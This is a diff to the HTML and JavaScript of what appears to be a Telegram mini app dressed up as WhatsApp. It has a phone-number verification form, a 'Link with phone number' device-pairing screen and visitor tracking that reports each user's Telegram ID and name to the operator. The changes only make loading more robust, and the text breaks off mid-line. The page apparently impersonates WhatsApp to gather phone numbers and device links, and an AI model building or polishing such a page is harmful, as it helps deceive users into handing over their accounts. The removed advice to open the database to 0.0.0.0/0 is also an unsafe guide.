@@ -15,13 +15,11 @@
         body { background-color: var(--bg-color); color: var(--text-main); height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         svg { fill: var(--text-muted); width: 24px; height: 24px; cursor: pointer; }
 
-        /* --- SPLASH SCREEN --- */
         #splash { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100%; background-color: var(--bg-color); }
         #splash h1 { color: var(--green-accent); font-size: 36px; margin-bottom: 20px; font-weight: bold; }
         .loader { border: 4px solid var(--header-bg); border-top: 4px solid var(--green-accent); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* --- REGISTRATION --- */
         #registration { display: none; flex-direction: column; height: 100%; padding: 40px 20px; background-color: var(--bg-color); }
         .reg-title { color: var(--green-accent); font-size: 32px; font-weight: bold; text-align: center; margin-bottom: 20px; margin-top: 30px; }
         .reg-subtitle { font-size: 18px; font-weight: 500; text-align: center; margin-bottom: 10px; }
@@ -32,7 +30,6 @@
         .phone-input { background: transparent; color: var(--text-main); border: none; border-bottom: 2px solid var(--green-accent); padding: 10px 0; font-size: 18px; outline: none; width: 100%; }
         .reg-btn { background-color: var(--green-accent); color: #111b21; border: none; padding: 14px; border-radius: 4px; font-size: 16px; font-weight: bold; width: 100%; max-width: 400px; margin: 0 auto; cursor: pointer; }
 
-        /* --- HOME SCREEN --- */
         #home { display: none; flex-direction: column; height: 100%; background-color: var(--panel-bg); position: relative; }
         .header { background-color: var(--header-bg); padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; height: 60px; }
         .header-title { font-size: 22px; font-weight: 600; color: var(--text-main); }
@@ -59,7 +56,6 @@
         .nav-icon { width: 24px; height: 24px; fill: var(--text-muted); }
         .nav-item.active .nav-icon { fill: var(--text-main); }
 
-        /* --- CHAT SCREEN --- */
         #chat-screen { display: none; flex-direction: column; height: 100%; position: absolute; top: 0; left: 0; width: 100%; z-index: 20; background-color: var(--bg-color); }
         .chat-header { background-color: var(--header-bg); padding: 10px 15px; display: flex; align-items: center; height: 60px; gap: 15px; }
         .chat-header-info { display: flex; flex-direction: column; flex: 1; }
@@ -78,14 +74,11 @@
     </style>
 </head>
 <body>
-    <!-- SPLASH SCREEN -->
     <div id="splash">
         <h1>WhatsApp</h1>
-        <div class="loader" id="loader"></div>
-        <p id="error-msg" style="display:none; color: #ff4d4d; margin-top: 20px; text-align: center; padding: 0 20px;"></p>
+        <div class="loader"></div>
     </div>
 
-    <!-- REGISTRATION -->
     <div id="registration">
         <div class="reg-title">WhatsApp</div>
         <div class="reg-subtitle">Verify your phone number</div>
@@ -103,7 +96,6 @@
         <button class="reg-btn" onclick="registerAccount()">Next</button>
     </div>
 
-    <!-- HOME SCREEN -->
     <div id="home">
         <div class="header">
             <div class="header-title">WhatsApp</div>
@@ -135,7 +127,6 @@
         </div>
     </div>
 
-    <!-- PAIR DEVICE SCREEN -->
     <div id="pair-screen" style="display:none; position:absolute; top:0; left:0; width:100%; height:100%; background-color:var(--bg-color); z-index: 50; flex-direction: column; padding: 20px; text-align:center;">
         <svg onclick="document.getElementById('pair-screen').style.display='none'" style="align-self: flex-start;" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
         <h2 style="margin-top:30px;">Link with phone number</h2>
@@ -144,7 +135,6 @@
         <button class="reg-btn" style="margin-top: 20px;" onclick="linkDevice()">Link Device</button>
     </div>
 
-    <!-- CHAT SCREEN -->
     <div id="chat-screen">
         <div class="chat-header">
             <svg onclick="closeChat()" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
@@ -171,22 +161,31 @@
         const user = tg.initDataUnsafe?.user || { id: 12345, first_name: "User" };
         let currentChatUser = "";
         const chatContainer = document.getElementById('chat-container');
+        let appReady = false;
 
-        // 1. INITIALIZATION & VISITOR TRACKING
+        // FAILSAFE: Stop the spinner after 6 seconds no matter what
+        setTimeout(() => {
+            if (!appReady) {
+                document.getElementById('splash').style.display = 'none';
+                document.getElementById('registration').style.display = 'flex';
+                console.log("Timeout reached. Showing registration.");
+            }
+        }, 6000);
+
         async function initApp() {
             try {
-                // Track the visit and notify you on Telegram
-                await fetch('/api/track_visit', {
+                // Send notification (don't wait for DB to respond to this)
+                fetch('/api/track_visit', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ user_id: user.id, name: user.first_name })
-                });
+                }).catch(e => console.log("Track error", e));
 
-                // Check if user is registered
+                // Check if user exists
                 const res = await fetch(`/api/check_user?user_id=${user.id}`);
-                if (!res.ok) throw new Error("Server error");
-                
                 const data = await res.json();
+                
+                appReady = true;
                 document.getElementById('splash').style.display = 'none';
                 
                 if (data.registered) {
@@ -195,16 +194,14 @@
                     document.getElementById('registration').style.display = 'flex';
                 }
             } catch (error) {
-                // If it fails, show an error instead of spinning forever
-                document.getElementById('loader').style.display = 'none';
-                const errMsg = document.getElementById('error-msg');
-                errMsg.style.display = 'block';
-                errMsg.innerText = "Connection failed. Please make sure your MongoDB network access is set to 0.0.0.0/0 and the server is running.";
-                console.error(error);
+                console.error("Init Error:", error);
+                // If it fails, let the timeout handle it, or force it now
+                appReady = true;
+                document.getElementById('splash').style.display = 'none';
+                document.getElementById('registration').style.display = 'flex';
             }
         }
 
-        // Run initialization after a tiny delay for visual effect
         setTimeout(initApp, 1000);
 
         function registerAccount() {
@@ -225,7 +222,6 @@
             loadChatList();
         }
 
-        // 2. CHAT LIST
         async function loadChatList() {
             try {
                 const res = await fetch(`/api/chats?user_id=${user.id}`);
@@ -253,7 +249,6 @@
             } catch(e) { console.log(e); }
         }
 
-        // 3. CHAT VIEW
         async function openChat(name, letter, color) {
             currentChatUser = name;
             document.getElementById('chat-name').innerText = name;
@@ -282,4 +277,9 @@
             const input = document.getElementById('message-input');
             const text = input.value.trim();
             if (!text) return;
-     
+            input.value = ''; 
+            addMessageToScreen(text, "sent"); 
+
+            await fetch('/api/send', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: user.id, text: text, chat_with: currentCh
